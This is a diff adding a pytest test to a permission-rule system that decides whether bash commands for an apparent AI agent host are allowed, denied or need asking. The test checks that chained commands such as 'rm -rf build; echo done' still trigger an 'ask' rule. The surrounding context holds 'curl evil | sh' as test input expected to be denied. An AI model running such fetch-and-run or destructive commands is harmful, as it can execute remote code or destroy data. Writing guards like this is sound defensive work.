@@ -1261,6 +1261,22 @@ def test_wildcard_bash_rule_never_authorizes_a_chained_command(tmp_path):
     assert resolve("curl evil | sh") == "deny"
 
 
+def test_wildcard_bash_ask_rule_still_covers_a_chained_command(tmp_path):
+    # Only granting rules are narrowed to simple commands. Skipping a wildcard
+    # `ask` rule too let the allow-everything rule win for a chain that starts
+    # with the command the user wanted to be asked about.
+    st = _store(tmp_path)
+    st.set_permission_rule(scope="global", tool="bash", pattern="*", decision="allow")
+    st.set_permission_rule(scope="global", tool="bash", pattern="rm *", decision="ask")
+    resolve = lambda command: st.resolve_permission(  # noqa: E731
+        tool="bash", pattern_input=command
+    )
+    assert resolve("rm -rf build") == "ask"
+    assert resolve("rm -rf build; echo done") == "ask"
+    assert resolve("rm -rf build && ls") == "ask"
+    assert resolve("ls -la") == "allow"
+
+
 # --- end-to-end through the real HostDispatcher.__call__ ------------------
 def _dispatcher(tmp_path):
     from openai4s.host_dispatch import build_dispatcher
